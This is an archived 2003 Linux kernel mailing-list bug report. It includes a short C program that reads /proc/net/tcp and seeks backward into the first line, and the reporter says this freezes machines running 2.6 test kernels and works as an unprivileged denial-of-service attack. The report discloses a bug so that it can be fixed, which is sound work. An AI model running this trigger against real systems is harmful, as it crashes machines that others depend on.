Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S261563AbTK0XFo (ORCPT <rfc822;willy@w.ods.org>);
	Thu, 27 Nov 2003 18:05:44 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261575AbTK0XFo
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Thu, 27 Nov 2003 18:05:44 -0500
Received: from head.linpro.no ([80.232.36.1]:44202 "EHLO head.linpro.no")
	by vger.kernel.org with ESMTP id S261563AbTK0XFh (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Thu, 27 Nov 2003 18:05:37 -0500
Subject: [BUG] scheduling while atomic when lseek()ing in /proc/net/tcp
From: Tore Anderson <tore@linpro.no>
To: linux-kernel@vger.kernel.org
Content-Type: text/plain
Organization: Linpro AS
Message-Id: <1069974335.14367.17.camel@echo.linpro.no>
Mime-Version: 1.0
X-Mailer: Ximian Evolution 1.4.5 
Date: Fri, 28 Nov 2003 00:05:35 +0100
Content-Transfer-Encoding: 7bit
X-Spam-Score: -4.9 (----)
X-Scanner: exiscan for exim4 (http://duncanthrax.net/exiscan/) *1APVCY-0003Hv-2h*Yx.6j0rx9KQ*
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


  Hi,

  The following code instantly freezes my all of my machines running 
 any of the beavers:

    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stdio.h>

    int main(void) {
            char buf[8192];
            int fd, chars;
            fd = open("/proc/net/tcp", O_RDONLY);
            chars = read(fd, buf, sizeof(buf));
            lseek(fd, -chars+1, SEEK_CUR);
            close(fd);
            return 0;
    }

  It only happens when I lseek() anywhere from -chars+1 to -chars+150
 inclusive (in other words, somewhere on the first line).  I do not
 need root to abuse this, which makes it an excellent DoS attack for
 anyone with an unprivileged account.

  I do get an oops, but as I do not have a serial console I'd rather
 not transcribe it to paper and post it unless it's crucial to
 pinpointing the bug.

-- 
Tore Anderson

